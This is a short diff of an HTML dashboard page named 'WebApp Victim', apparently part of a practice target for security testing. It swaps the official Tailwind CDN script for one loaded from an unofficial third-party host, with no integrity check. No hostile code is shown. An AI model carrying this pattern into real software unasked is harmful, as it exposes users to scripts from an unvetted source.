@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     <title>داشبورد کاربری | WebApp Victim</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://tailwindcss.eitebar.ir/tailwind-play.js"></script>
     <style>
         body { font-family: Tahoma, sans-serif; }
     </style>
